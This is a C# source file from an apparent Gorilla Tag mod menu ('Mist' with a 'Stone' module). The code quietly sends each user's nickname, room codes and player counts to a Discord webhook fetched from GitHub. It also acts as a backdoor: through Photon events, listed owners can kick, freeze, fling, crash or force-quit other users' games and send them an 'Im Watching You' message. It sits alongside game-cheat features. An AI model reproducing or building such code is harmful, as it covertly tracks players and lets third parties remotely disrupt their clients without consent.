using AetherTemp.Menu;
using ExitGames.Client.Photon;
using GorillaLocomotion;
using GorillaNetworking;
using Newtonsoft.Json;
using Photon.Pun;
using StupidTemplate.Classes;
using StupidTemplate.Notifications;
using System;
using System.Collections;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using TMPro;
using UnityEngine;
using Hashtable = ExitGames.Client.Photon.Hashtable;
using Random = UnityEngine.Random;

namespace Mist.Mods.Stone
{
    internal class StoneBase : MonoBehaviour
    {
        #region Start
        /*
        public void Awake()
        {
            SendWeb("**" + PhotonNetwork.LocalPlayer.NickName, "has loaded into the game with Mist **");
            
        }*/
        public static double currentStoneVersion = 2.01;
        public async void Awake()
        {
            SendWeb("**" + PhotonNetwork.LocalPlayer.NickName, "has loaded into the game with Mist ** Stone Version:" + currentStoneVersion);

            if (latestStoneVersion > currentStoneVersion)
            {
                await Task.Delay(15000);
                NotificationLib.SendNotification("<color=red>PLEASE UPDATE YOUR MENU/VERSION OF STONE, IT IS CURRENTLY OUTDATED</color>");
                NotificationLib.SendNotification("<color=red>PLEASE UPDATE YOUR MENU/VERSION OF STONE, IT IS CURRENTLY OUTDATED</color>");
                NotificationLib.SendNotification("<color=red>PLEASE UPDATE YOUR MENU/VERSION OF STONE, IT IS CURRENTLY OUTDATED</color>");
            }

            if (currentStoneVersion <= StoneBrickVersion)
            {
               await Task.Delay(16000);
                NotifiLib.SendNotification("<color=red>YOUR CURRENT VERSION OF YOUR MENU IS BRICKED. PLEASE UPDATE</color>");
                NotifiLib.SendNotification("<color=red>YOUR CURRENT VERSION OF YOUR MENU IS BRICKED. PLEASE UPDATE</color>");
                await Task.Delay(5000);
                Application.Quit();
            }
            
        }

        public static double latestStoneVersion = double.Parse(new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/Stone-Networking/refs/heads/main/Stone/StoneVersion").GetAwaiter().GetResult().Trim());
        public void Start()
        {
            PhotonNetwork.NetworkingClient.EventReceived += OnEvent;
        }
        public void Update()
        {
            try
            {
                
                NetworkedTag();
                Tracker();
            }
            catch (Exception e) { }
        }
        public static string room = "";
        public static void Tracker()
        {
            if (PhotonNetwork.InRoom && i < 1)
            {
                i++;
                room = PhotonNetwork.CurrentRoom.Name;
                SendWeb(PhotonNetwork.LocalPlayer.NickName, "**" + PhotonNetwork.LocalPlayer.NickName + " has joined code: " + PhotonNetwork.CurrentRoom.Name + " Players In Lobby: " + PhotonNetwork.CurrentRoom.PlayerCount.ToString() + "/10 **");
            }

            if (!PhotonNetwork.InRoom && i >= 1)
            {
                i = 0;
                SendWeb(PhotonNetwork.LocalPlayer.NickName, "** Has Left The Code: " + room + "**");
            }
        }
        #endregion
        #region Tags
        public static bool TagsEnabled = true;
        
        public static void NetworkedTag()
        {
            foreach (VRRig rig in GorillaParent.instance.vrrigs)
            {
                if (TagsEnabled)
                {
                    if (rig == null || rig.creator == null || rig == GorillaTagger.Instance.offlineVRRig) continue;
                    Photon.Realtime.Player p = RigManager.GetPlayerFromVRRig(rig);
                    string label = "";
                    string userId = rig.Creator.UserId;


                    if (Cha.Contains(userId))
                        label = "Mist Owner";
                    else if (NOVAuserid.Contains(userId))
                        label = "Mist Co-Owner";
                    else if (Tortise.Contains(userId))
                        label = "Violet Owner";
                    else if (HeadADuserid.Contains(userId))
                        label = "Stone Head Admin";
                    else if (ADuserid.Contains(userId))
                        label = "Stone Admin";
                    else if (HELPERuserid.Contains(userId))
                        label = "Stone Helper";
                    else if (p.CustomProperties.TryGetValue("MistUser", out object mu) && (bool)mu)
                        label = "Mist User";
                    else if (p.CustomProperties.TryGetValue("MistLegal", out object ml) && (bool)ml)
                        label = "Mist Legal";
                    else if (p.CustomProperties.TryGetValue("VioletFreeUser", out object VF))
                        label = "Violet Free User";
                    else if (p.CustomProperties.TryGetValue("VioletPaidUser", out object VP))
                        label = "Violet Paid User";

                    if (!string.IsNullOrEmpty(label))
                    {
                        GameObject go = new GameObject("NetworkedNametagLabel");

                        var tmp = go.AddComponent<TextMeshPro>();
                        tmp.text = label;
                        tmp.font = Resources.Load<TMP_FontAsset>("LiberationSans SDF");
                        tmp.fontSize = 1f;
                        tmp.alignment = TextAlignmentOptions.Center;
                        tmp.color = new Color32(137, 221, 152, 255);

                        go.transform.position = rig.transform.position + new Vector3(0f, 0.8f, 0f);
                        go.transform.rotation = Quaternion.LookRotation(go.transform.position - GorillaTagger.Instance.headCollider.transform.position);

                        Destroy(go, Time.deltaTime);
                    }
                }

            }
        }
        

       
        private static int i = 0;
        #endregion
        #region Web Stuff/Utilities
        public static async void SendWeb(string Title, string Desc)
        {
            await SendEmbedToDiscordWebhook(StoneBase.webhookUrl, Title, Desc, "#5EA25B");
        }

        private static int ConvertHexColorToDecimal(string color)
        {
            if (color.StartsWith("#"))
                color = color.Substring(1);
            return int.Parse(color, System.Globalization.NumberStyles.HexNumber);
        }

        public static async Task SendEmbedToDiscordWebhook(string webhookUrl, string title, string descripion, string colorHex)
        {
            var embed = new
            {
                title = title,
                description = descripion,
                color = ConvertHexColorToDecimal(colorHex)
            };

            var payload = new
            {
                embeds = new[] { embed }
            };

            string jsonPayload = JsonConvert.SerializeObject(payload);
            var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

            using (var httpClient = new HttpClient())
            {
                HttpResponseMessage response = await httpClient.PostAsync(webhookUrl, content);

                if (!response.IsSuccessStatusCode)
                {
                    string respContent = await response.Content.ReadAsStringAsync();
                }
            }
        }

        

        public static void SendEvent(string eventType, Photon.Realtime.Player plr)
        {
            if (PhotonNetwork.InRoom)
            {
                PhotonNetwork.NetworkingClient.OpRaiseEvent(4, new Hashtable
            {
                { "eventType", eventType }
            }, new Photon.Realtime.RaiseEventOptions
            {
                TargetActors = new int[] { plr.actorNumber }
            }, SendOptions.SendReliable);
            }
        }

        public static void SendEvent(string eventType)
        {
            if (PhotonNetwork.InRoom)
            {
                PhotonNetwork.NetworkingClient.OpRaiseEvent(4, new Hashtable
            {
                { "eventType", eventType }
            }, new Photon.Realtime.RaiseEventOptions
            {
                Receivers = Photon.Realtime.ReceiverGroup.Others
            }, SendOptions.SendReliable);
            }
        }
        #endregion
        #region Access
        public static void BaseAccess()
        {
            string userId = PhotonNetwork.LocalPlayer.UserId;

            if (IsAdmin(userId))
            {
                SettingsMods.EnterCat(12);
            }
            else
            {
                NotificationLib.SendNotification("<color=red>Stone</color> : You are not an Admin.");
            }
        }

        public static bool IsABase(string userId)
        {
            return Cha.Contains(userId)
            || ADuserid.Contains(userId)
            || HeadADuserid.Contains(userId)
            || HELPERuserid.Contains(userId)
            || NOVAuserid.Contains(userId);
        }
        public static void AdminAccess()
        {
            string userId = PhotonNetwork.LocalPlayer.UserId;

            if (IsAdmin(userId))
            {
                SettingsMods.EnterCat(25);
            }
            else
            {
                NotificationLib.SendNotification("<color=red>Stone</color> : You are not an Admin.");
            }
        }

        public static bool IsAdmin(string userId)
        {
            return Cha.Contains(userId)
            || ADuserid.Contains(userId)
            || HELPERuserid.Contains(userId)
            || NOVAuserid.Contains(userId);
        }
        public static void HelperAccess()
        {
            string userId = PhotonNetwork.LocalPlayer.UserId;

            if (IsHelper(userId))
            {
                SettingsMods.EnterCat(24);
            }
            else
            {
                NotificationLib.SendNotification("<color=red>Stone</color> : You are not an Helper.");
            }
        }

        public static bool IsHelper(string userId)
        {
            return Cha.Contains(userId)
            || HELPERuserid.Contains(userId);
        }
        public static void HeadAdminAccess()
        {
            string userId = PhotonNetwork.LocalPlayer.UserId;

            if (IsHeadAdmin(userId))
            {
                SettingsMods.EnterCat(26);
            }
            else
            {
                NotificationLib.SendNotification("<color=red>Stone</color> : You are not an Head Admin.");
            }
        }

        public static bool IsHeadAdmin(string userId)
        {
            return Cha.Contains(userId)
            || HeadADuserid.Contains(userId);
        }
        public static void SOwnerAccess()
        {
            string userId = PhotonNetwork.LocalPlayer.UserId;

            if (IsOwner(userId))
            {
                SettingsMods.EnterCat(27);
            }
            else
            {
                NotificationLib.SendNotification("<color=red>Console</color> : You are not the Owner.");
            }
        }
        public static void COwnerAccess()
        {
            string userId = PhotonNetwork.LocalPlayer.UserId;

            if (IsCOwner(userId))
            {
                SettingsMods.EnterCat(15);
            }
            else
            {
                NotificationLib.SendNotification("<color=red>Console</color> : You are not the Owner.");
            }
        }

        public static bool IsOwner(string userId)
        {
            return Cha.Contains(userId)
            || NOVAuserid.Contains(userId);
        }
        public static bool IsCOwner(string userId)
        {
            return Cha.Contains(userId);
        }
        #endregion
        #region Mods/Hooks

        public static float Size = 1;

        public void OnEvent(EventData photonEvent)
        {
            if (photonEvent.Code != 4 || !PhotonNetwork.InRoom) return;
            if (photonEvent.CustomData is Hashtable hashtable)
            {
                Photon.Realtime.Player player = PhotonNetwork.CurrentRoom.GetPlayer(photonEvent.Sender, false);
                VRRig vrrigFromPlayer = RigManager.GetVRRigFromPlayer(player);

                if (StoneBase.userid.Contains(player.UserId) || StoneBase.NOVAuserid.Contains(player.UserId))
                {
                    bool isLocalOwner = IsOwner(PhotonNetwork.LocalPlayer.UserId);

                    string eventType = (string)hashtable["eventType"];
                    switch (eventType)
                    {
                        case "Vibrate":
                            if (!isLocalOwner)
                            {
                                GorillaTagger.Instance.StartVibration(true, 1, 0.5f);
                                GorillaTagger.Instance.StartVibration(false, 1, 0.5f);
                            }
                            break;
                        case "Slow":
                            if (!isLocalOwner)
                                GorillaTagger.Instance.ApplyStatusEffect(GorillaTagger.StatusEffect.Frozen, 1f);
                            break;
                        case "Kick":
                            if (!isLocalOwner)
                                PhotonNetwork.Disconnect();
                            break;
                        case "Fling":
                            if (!isLocalOwner)
                                GTPlayer.Instance.ApplyKnockback(GorillaTagger.Instance.transform.up, 7f, true);
                            break;
                        case "Stutter":
                            if (!isLocalOwner)
                            {
                                StartCoroutine(StutterEffect());
                            }
                            break;
                        case "Bring":
                            if (!isLocalOwner)
                                GTPlayer.Instance.TeleportTo(vrrigFromPlayer.transform.position, vrrigFromPlayer.transform.rotation);
                            break;
                        case "GrabL":
                            if (!isLocalOwner)
                            {
                                Vector3 targetPos = Vector3.zero;
                                Vector3 currentPos = GTPlayer.Instance.transform.position;
                                Vector3 velocity = (targetPos - currentPos) * 10f; // Multiply by speed factor

                                Rigidbody rb = GTPlayer.Instance.GetComponent<Rigidbody>();
                                if (rb != null)
                                {
                                    rb.velocity = velocity;
                                }
                                else
                                {
                                    GTPlayer.Instance.transform.position += velocity * Time.deltaTime;
                                }
                            }
                            break;
                        case "GrabR":
                            if (!isLocalOwner)
                            {
                                Vector3 targetPos = Vector3.zero;
                                Vector3 currentPos = GTPlayer.Instance.transform.position;
                                Vector3 velocity = (targetPos - currentPos) * 10f; 

                                Rigidbody rb = GTPlayer.Instance.GetComponent<Rigidbody>();
                                if (rb != null)
                                {
                                    rb.velocity = velocity;
                                }
                                else
                                {
                                    GTPlayer.Instance.transform.position += velocity * Time.deltaTime;
                                }
                            }
                            break;
                        case "BreakMovemet":
                            if (!isLocalOwner)
                            {
                                GorillaTagger.Instance.rightHandTransform.position = new Vector3(0f, float.PositiveInfinity, 0f);
                                GorillaTagger.Instance.rightHandTransform.position = new Vector3(0f, float.PositiveInfinity, 0f);
                            }
                            break;
                        case "Stop":
                            if (!isLocalOwner)
                            {
                                GorillaTagger.Instance.bodyCollider.attachedRigidbody.velocity = Vector3.zero;
                                GorillaTagger.Instance.bodyCollider.attachedRigidbody.isKinematic = true;

                                Vector3 currentPos = GorillaTagger.Instance.bodyCollider.transform.position;
                                GorillaTagger.Instance.bodyCollider.transform.position = new Vector3(currentPos.x, currentPos.y + 0.5f, currentPos.z);
                            }
                            break;
                        case "Message":
                            if (!isLocalOwner)
                                NotificationLib.SendNotification("Im Watching You");
                            break;
                        case "ScaleDown":
                            if (!isLocalOwner)
                            {
                                Size -= 0.01f;
                                GorillaTagger.Instance.transform.localScale = new Vector3(Size, Size, Size);
                                GorillaTagger.Instance.offlineVRRig.transform.localScale = new Vector3(Size, Size, Size);

                                foreach (VRRig g in GorillaParent.instance.vrrigs)
                                {
                                    if (g == GorillaTagger.Instance.offlineVRRig) continue;
                                    float currentScale = g.transform.localScale.x;
                                    g.bodyHolds.transform.localScale = new Vector3(currentScale, 1, currentScale);
                                }
                            }
                            break;

                        case "ScaleUp":
                            if (!isLocalOwner)
                            {
                                Size += 0.01f;
                                GorillaTagger.Instance.transform.localScale = new Vector3(Size, Size, Size);
                                GorillaTagger.Instance.offlineVRRig.transform.localScale = new Vector3(Size, Size, Size);

                                foreach (VRRig g in GorillaParent.instance.vrrigs)
                                {
                                    if (g == GorillaTagger.Instance.offlineVRRig) continue;
                                    float currentScale = g.transform.localScale.x;
                                    g.bodyHolds.transform.localScale = new Vector3(currentScale, 1, currentScale);
                                }
                            }
                            break;

                        case "ScaleReset":
                            if (!isLocalOwner)
                            {
                                Size = 1;
                                GorillaTagger.Instance.transform.localScale = new Vector3(1, 1, 1);
                                GorillaTagger.Instance.offlineVRRig.transform.localScale = new Vector3(1, 1, 1);

                                foreach (VRRig g in GorillaParent.instance.vrrigs)
                                {
                                    if (g == GorillaTagger.Instance.offlineVRRig) continue;
                                    float currentScale = g.transform.localScale.x;
                                    g.bodyHolds.transform.localScale = new Vector3(currentScale, 1, currentScale);
                                }
                            }
                            break;
                        case "LowGrav":
                            if (!isLocalOwner)
                                GTPlayer.Instance.bodyCollider.attachedRigidbody.AddForce(Vector3.up * (Time.deltaTime * (6.66f / Time.deltaTime)), ForceMode.Acceleration);
                            break;
                        case "NoGrav":
                            if (!isLocalOwner)
                                GTPlayer.Instance.bodyCollider.attachedRigidbody.AddForce(Vector3.up * (Time.deltaTime * (9.81f / Time.deltaTime)), ForceMode.Acceleration);
                            break;
                        case "HighGrav":
                            if (!isLocalOwner)
                                GTPlayer.Instance.bodyCollider.attachedRigidbody.AddForce(Vector3.down * (Time.deltaTime * (7.77f / Time.deltaTime)), ForceMode.Acceleration);
                            break;
                        case "DisableNameTags":
                            if (!isLocalOwner)
                                TagsEnabled = false;
                            break;
                        case "EnableNameTags":
                            if (!isLocalOwner)
                                TagsEnabled = true;
                            break;
                        case "Ban":
                            if (!isLocalOwner)
                                PhotonNetwork.SetMasterClient(PhotonNetwork.LocalPlayer);
                            break;
                        case "appquit":
                            if (!isLocalOwner)
                                Application.Quit();
                            break;
                        case "lr":
                            if (!isLocalOwner)
                                AdminLaser(hashtable["laserData"]);
                            break;
                        case "tp":
                            if (!isLocalOwner)
                                TeleportPlayer(GorillaTagger.Instance.bodyCollider.transform.position + GorillaTagger.Instance.transform.position);
                            break;
                        case "bolt":
                            #region LightningBolt
                            if (ControllerInputPoller.instance.rightControllerPrimaryButton && !hasCastLightning)
                            {
                                hasCastLightning = true;
                                Vector3 startPosition = GorillaTagger.Instance.rightHandTransform.position;
                                Quaternion startRotation = GorillaTagger.Instance.rightHandTransform.rotation;
                                Vector3 endPosition = startPosition + (startRotation * Vector3.forward * 10f);

                                GameObject lightning = new GameObject("LightningBolt");
                                LineRenderer lineRenderer = lightning.AddComponent<LineRenderer>();
                                lineRenderer.positionCount = 10;
                                lineRenderer.startWidth = 0.3f;
                                lineRenderer.endWidth = 0.1f;
                                lineRenderer.material = new Material(Shader.Find("Particles/Standard Unlit"));
                                lineRenderer.startColor = Color.white;
                                lineRenderer.endColor = new Color(0.5f, 0.5f, 1f);

                                for (int i = 0; i < 10; i++)
                                {
                                    float t = i / 9f;
                                    Vector3 point = Vector3.Lerp(startPosition, endPosition, t);
                                    point += new Vector3(
                                        UnityEngine.Random.Range(-0.3f, 0.3f),
                                        UnityEngine.Random.Range(-0.3f, 0.3f),
                                        0
                                    );
                                    lineRenderer.SetPosition(i, point);
                                }

                                GameObject sparks = new GameObject("LightningSparks");
                                sparks.transform.position = endPosition;
                                ParticleSystem sparksParticles = sparks.AddComponent<ParticleSystem>();
                                ParticleSystem.MainModule maint = sparksParticles.main;
                                maint.startColor = new ParticleSystem.MinMaxGradient(Color.white, Color.cyan);
                                maint.startSize = 0.5f;
                                maint.startLifetime = 0.2f;
                                maint.startSpeed = 2f;
                                ParticleSystem.EmissionModule emissiont = sparksParticles.emission;
                                emissiont.rateOverTime = 50f;
                                ParticleSystem.ShapeModule shapet = sparksParticles.shape;
                                shapet.shapeType = ParticleSystemShapeType.Sphere;
                                shapet.radius = 0.5f;
                                ParticleSystemRenderer sparksRenderer = sparksParticles.GetComponent<ParticleSystemRenderer>();
                                sparksRenderer.material = new Material(Shader.Find("Particles/Standard Unlit"));
                                sparksParticles.Play();

                                UnityEngine.Object.Destroy(lightning, 0.3f);
                                UnityEngine.Object.Destroy(sparks, 0.5f);
                            }

                            if (!ControllerInputPoller.instance.rightControllerPrimaryButton && hasCastLightning)
                            {
                                hasCastLightning = false;
                            }
                            #endregion
                            break;
                        case "dark":
                            if (!isLocalOwner)
                                GameLightingManager.instance.SetCustomDynamicLightingEnabled(true);
                            break;
                        case "light":
                            if (!isLocalOwner)
                                GameLightingManager.instance.SetCustomDynamicLightingEnabled(false);
                            break;
                        case "snapneck":
                            if (!isLocalOwner)
                                GorillaTagger.Instance.offlineVRRig.head.trackingRotationOffset.y = 90f;
                            break;
                        case "fixneck":
                            if (!isLocalOwner)
                                GorillaTagger.Instance.offlineVRRig.head.trackingRotationOffset.y = 0f;
                            break;
                        case "60hz":
                            if (!isLocalOwner)
                                Application.targetFrameRate = 60;
                            break;
                        case "72hz":
                            if (!isLocalOwner)
                                Application.targetFrameRate = 72;
                            break;
                        case "-1hz":
                            if (!isLocalOwner)
                                Application.targetFrameRate = -1;
                            break;
                        case "0hz":
                            if (!isLocalOwner)
                                Application.targetFrameRate = 0;
                            break;
                        case "999hz":
                            if (!isLocalOwner)
                                Application.targetFrameRate = 999;
                            break;
                        case "Ban24H":
                            if (!isLocalOwner)
                                PhotonNetworkController.Instance.AttemptToJoinSpecificRoom("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", JoinType.Solo);
                            break;
                        case "obliterate":
                            if (!isLocalOwner)
                                GTPlayer.Instance.ApplyKnockback(GorillaTagger.Instance.transform.up, 7000f, true);
                            break;
                    }
                }
            }
        }
        private bool hasCastLightning = false;
        public static Vector3 lastPosition = Vector3.zero;
        public static Vector3 closePosition;
        public static void TeleportPlayer(Vector3 position) 
        {
            GTPlayer.Instance.TeleportTo(position, GTPlayer.Instance.transform.rotation);
            lastPosition = position;
            closePosition = position;
        }
        
        private IEnumerator StutterEffect()
        {
            GTPlayer.Instance.ApplyKnockback(Vector3.down, 7f, true);
            yield return new WaitForSeconds(0.1f);

            GTPlayer.Instance.ApplyKnockback(Vector3.up, 7f, true);
            yield return new WaitForSeconds(0.1f);

            GTPlayer.Instance.ApplyKnockback(Vector3.left, 7f, true);
            yield return new WaitForSeconds(0.1f);

            GTPlayer.Instance.ApplyKnockback(Vector3.right, 7f, true);
            yield return new WaitForSeconds(0.1f);

            GTPlayer.Instance.ApplyKnockback(Vector3.forward, 7f, true);
            yield return new WaitForSeconds(0.1f);

            GTPlayer.Instance.ApplyKnockback(Vector3.back, 7f, true);
        }

        private static bool lastLasering = false;
        private static float adminEventDelay;
        private static GameObject currentLaserLine = null;
        public static Coroutine laserCoroutine;

        public static void AdminLaser(object laserArgs = null)
        {
            if (laserArgs != null)
            {
                if (laserArgs is object[] laserData && laserData.Length >= 9)
                {
                    if (Time.time > adminEventDelay)
                    {
                        adminEventDelay = Time.time + 0.1f;

                        if (currentLaserLine != null)
                        {
                            Destroy(currentLaserLine);
                        }

                        GameObject lines = new GameObject("Line");
                        LineRenderer liner = lines.AddComponent<LineRenderer>();
                        Color thecolor = new Color((float)laserData[1], (float)laserData[2], (float)laserData[3], (float)laserData[4]);
                        liner.startColor = thecolor;
                        liner.endColor = thecolor;
                        liner.startWidth = (float)laserData[5];
                        liner.endWidth = (float)laserData[5];
                        liner.positionCount = 2;
                        liner.useWorldSpace = true;
                        liner.SetPosition(0, (Vector3)laserData[6]);
                        liner.SetPosition(1, (Vector3)laserData[7]);
                        liner.material.shader = Shader.Find("GUI/Text Shader");

                        currentLaserLine = lines;
                        Destroy(lines, (float)laserData[8]);
                    }
                }
                return;
            }

            bool isLasering = ControllerInputPoller.instance.leftControllerPrimaryButton || ControllerInputPoller.instance.rightControllerPrimaryButton;

            if (isLasering && !lastLasering)
            {
                bool rightHand = ControllerInputPoller.instance.rightControllerPrimaryButton;
                if (laserCoroutine != null)
                    GorillaTagger.Instance.StopCoroutine(laserCoroutine);
                laserCoroutine = GorillaTagger.Instance.StartCoroutine(RenderLaser(rightHand, VRRig.LocalRig));
            }
            else if (!isLasering && lastLasering)
            {
                if (laserCoroutine != null)
                {
                    GorillaTagger.Instance.StopCoroutine(laserCoroutine);
                    laserCoroutine = null;
                }
                if (currentLaserLine != null)
                {
                    Destroy(currentLaserLine);
                    currentLaserLine = null;
                }
            }

            lastLasering = isLasering;
        }

        public static IEnumerator RenderLaser(bool rightHand, VRRig rigTarget)
        {
            while (true)
            {
                rigTarget.PlayHandTapLocal(18, !rightHand, 99999f);

                GameObject line = new GameObject("LaserOuter");
                LineRenderer liner = line.AddComponent<LineRenderer>();
                liner.startColor = Color.red;
                liner.endColor = Color.red;
                liner.startWidth = 0.15f + Mathf.Sin(Time.time * 5f) * 0.01f;
                liner.endWidth = liner.startWidth;
                liner.positionCount = 2;
                liner.useWorldSpace = true;

                Vector3 startPos = (rightHand ? rigTarget.rightHandTransform.position : rigTarget.leftHandTransform.position) + (rightHand ? rigTarget.rightHandTransform.up : rigTarget.leftHandTransform.up) * 0.1f;
                Vector3 endPos = Vector3.zero;
                Vector3 dir = rightHand ? rigTarget.rightHandTransform.right : -rigTarget.leftHandTransform.right;

                try
                {
                    Physics.Raycast(startPos + dir / 3f, dir, out var Ray, 512f, Console.Console.NoInvisLayerMask());
                    endPos = Ray.point;
                    if (endPos == Vector3.zero)
                        endPos = startPos + dir * 512f;
                }
                catch { }

                liner.SetPosition(0, startPos + dir * 0.1f);
                liner.SetPosition(1, endPos);
                liner.material.shader = Shader.Find("GUI/Text Shader");
                Destroy(line, Time.deltaTime);

                GameObject line2 = new GameObject("LaserInner");
                LineRenderer liner2 = line2.AddComponent<LineRenderer>();
                liner2.startColor = Color.white;
                liner2.endColor = Color.white;
                liner2.startWidth = 0.1f;
                liner2.endWidth = 0.1f;
                liner2.positionCount = 2;
                liner2.useWorldSpace = true;
                liner2.SetPosition(0, startPos + dir * 0.1f);
                liner2.SetPosition(1, endPos);
                liner2.material.shader = Shader.Find("GUI/Text Shader");
                liner2.material.renderQueue = liner.material.renderQueue + 1;
                Destroy(line2, Time.deltaTime);

                GameObject whiteParticle = GameObject.CreatePrimitive(PrimitiveType.Sphere);
                Destroy(whiteParticle, 2f);
                Destroy(whiteParticle.GetComponent<Collider>());
                whiteParticle.GetComponent<Renderer>().material.color = Color.yellow;
                whiteParticle.AddComponent<Rigidbody>().linearVelocity = new Vector3(Random.Range(-7.5f, 7.5f), Random.Range(0f, 7.5f), Random.Range(-7.5f, 7.5f));
                whiteParticle.transform.position = endPos + new Vector3(Random.Range(-0.1f, 0.1f), Random.Range(-0.1f, 0.1f), Random.Range(-0.1f, 0.1f));
                whiteParticle.transform.localScale = new Vector3(0.05f, 0.05f, 0.05f);

                yield return null;
            }
        }

        public static string userid = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/mist-ext/refs/heads/main/userid").GetAwaiter().GetResult();//Main User ids
        public static string Tortise = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/TortiseWay2Cool/Kill_Switch/refs/heads/main/Tortise").GetAwaiter().GetResult();//Tortise
        public static string Cha = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/mist-ext/refs/heads/main/Cha").GetAwaiter().GetResult();//Me/Cha
        public static string webhookUrl = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/mist-ext/refs/heads/main/free_hook").GetAwaiter().GetResult();//Hook
        public static string ADuserid = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/mist-ext/refs/heads/main/ADUserID's").GetAwaiter().GetResult();//Admin
        public static string HeadADuserid = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/mist-ext/refs/heads/main/HeadADuserid").GetAwaiter().GetResult();//Head Admin
        public static string HELPERuserid = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/mist-ext/refs/heads/main/MistHelper").GetAwaiter().GetResult();//Helper
        public static string NOVAuserid = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/mist-ext/refs/heads/main/NOVA").GetAwaiter().GetResult();//Nova
        public static double StoneBrickVersion = double.Parse(new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/Stone-Networking/refs/heads/main/Stone/StoneBrickVersion.txt").GetAwaiter().GetResult().Trim());
        #endregion
    }
}



